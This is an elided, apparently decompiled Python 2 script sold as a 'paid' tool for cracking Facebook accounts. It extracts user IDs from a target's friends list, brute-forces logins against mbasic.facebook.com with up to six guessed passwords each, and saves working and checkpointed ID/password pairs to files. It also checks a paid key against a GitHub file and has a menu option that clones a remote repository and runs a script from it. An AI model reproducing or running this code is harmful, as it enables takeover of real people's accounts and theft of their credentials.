...
# File: RAISUL-ISLAM-PAID.py (Python 2.7)
...
\033[1;35m   _____       _           _ 
\033[1;34m |  __ \     (_)         | |
\033[1;32m | |__) |__ _ _ ___ _   _| |
\033[1;33m |  _  // _` | / __| | | | |
\033[1;31m | | \ \ (_| | \__ \ |_| | |
\033[1;34m |_|  \_\__,_|_|___/\__,_|_|

\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;34m Author \x1b[1;97m : \033[1;34m        Raisul-Islam
\033[1;31m\033[1;35m Facebook\x1b[1;97m:  \033[1;35m      Dada is back 
\033[1;31m\033[1;33m Github\x1b[1;97m    : \033[1;33m        dadavau
...
def main_apv():
    ...
    try:
        ...
        print '         YOUR KEY : ' + imt
        kok = open('/sdcard/.Raisul-islam.txt', 'w')
        kok.write(imt)
        kok.close()
        print ''
        ...
        os.system('xdg-open https://wa.me/+8801309200208')

    r1 = requests.get('https://github.com/dadavau/paid-approval.txt/blob/main/paid-approval.txt').text
    if key1 in r1:
        main_system()
    else:
        os.system('clear')
...
def main_input():
    ...
    if mx == '1':
        ...
        print '\x1b[1;92m        Member In Raisul-islam Paid Commands '
        print '\x1b[1;91m        ENJOY Koro Bro'
        time.sleep(3.5)
        main_system()
    elif mx == '6':
        os.system('git clone https://github.com/raisul/PAID')
        os.system('rm -rf PAID')
        os.system('cp -f PAID/PAID \\.')
        os.system('rm -rf PAID')
        os.system(' cd PAID')
        os.system(' python2 Raisul-vai.py')
        time.sleep(5)
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[Raisul-vai-OK] ' + coc + user + ' | ' + pass1
                ok = open('random-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[Raisul-vai-CP] ' + coc + user + ' | ' + pass1
                cp = open('Raisul-vai random-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
...
def mineExt():
    ...
    fuck.close()
    print ''
    print sm + '[=] Extracting From Raisul-vai : ' + nid + ' > \x1b[1;91mFriends'
    print ''
    time.sleep(2)
    ...
    print g + '[=] Extracting From Raisul-vai : ' + my_line[:15]
    ...
    def main(arg):
        ...
        try:
            ...
            b = rana.post('https://mbasic.facebook.com/login.php', data = {
                ...
                'login': 'submit' })
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[IRaisul-vai-OK] ' + uid + ' | ' + pass1
                ok = open('Raisul-vai-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[Raisul-vai-CP] ' + uid + ' | ' + pass1
                cp = open('Raisul-vai-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                ...
                b = rana.post('https://mbasic.facebook.com/login.php', data = {
                    ...
                    'login': 'submit' })
                if 'c_user' in rana.cookies.get_dict().keys():
                    print '\x1b[1;92m[Raisul-vai-OK] ' + uid + ' | ' + pass2
                    ok = open('Raisul-vai-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in rana.cookies.get_dict().keys():
                    print '\x1b[1;91m[Raisul-vai-CP] ' + uid + ' | ' + pass2
                    cp = open('Raisul-vai-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    b = rana.post('https://mbasic.facebook.com/login.php', data = {
                        ...
                        'login': 'submit' })
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print '\x1b[1;92m[Raisul-vai-OK] ' + uid + ' | ' + pass3
                        ok = open('Raisul-vai-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in rana.cookies.get_dict().keys():
                        print '\x1b[1;91m[Raisul-vai-CP] ' + uid + ' | ' + pass3
                        cp = open('Raisul-vai-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        b = rana.post('https://mbasic.facebook.com/login.php', data = {
                            ...
                            'login': 'submit' })
                        if 'c_user' in rana.cookies.get_dict().keys():
                            print '\x1b[1;92m[Raisul-vai-OK] ' + uid + ' | ' + pass4
                            ok = open('Raisul-vai-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'checkpoint' in rana.cookies.get_dict().keys():
                            print '\x1b[1;91m[IRaisul-vai-CP] ' + uid + ' | ' + pass4
                            cp = open('Raisul-vai-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            b = rana.post('https://mbasic.facebook.com/login.php', data = {
                                ...
                                'login': 'submit' })
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print '\x1b[1;92m[Raisul-vai-OK] ' + uid + ' | ' + pass5
                                ok = open('Raisul-vai-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'checkpoint' in rana.cookies.get_dict().keys():
                                print '\x1b[1;91m[Raisul-vai-CP] ' + uid + ' | ' + pass5
                                cp = open('Raisul-vai-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
    ...
    def main(arg):
        ...
        try:
            ...
            b = rana.post('https://mbasic.facebook.com/login.php', data = {
                ...
                'login': 'submit' })
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[Raisul-vai-OK] ' + uid + ' | ' + pass1
                ok = open('Raisul-vai-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
                ...
                if 'c_user' in rana.cookies.get_dict().keys():
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            print '\x1b[1;91m[Raisul-vai-CP] ' + uid + ' | ' + pass4
                            cp = open('Raisul-vai-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                print '\x1b[1;91m[IRaisul-vai-CP] ' + uid + ' | ' + pass5
                                cp = open('Raisul-vai-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                b = rana.post('https://mbasic.facebook.com/login.php', data = {
                                    ...
                                    'login': 'submit' })
                                if 'c_user' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;92m[Raisul-vai-OK] ' + uid + ' | ' + pass6
                                    ok = open('Raisul-vai-ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'checkpoint' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;91m[Raisul-vai-CP] ' + uid + ' | ' + pass6
                                    cp = open('Raisul-vai-cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
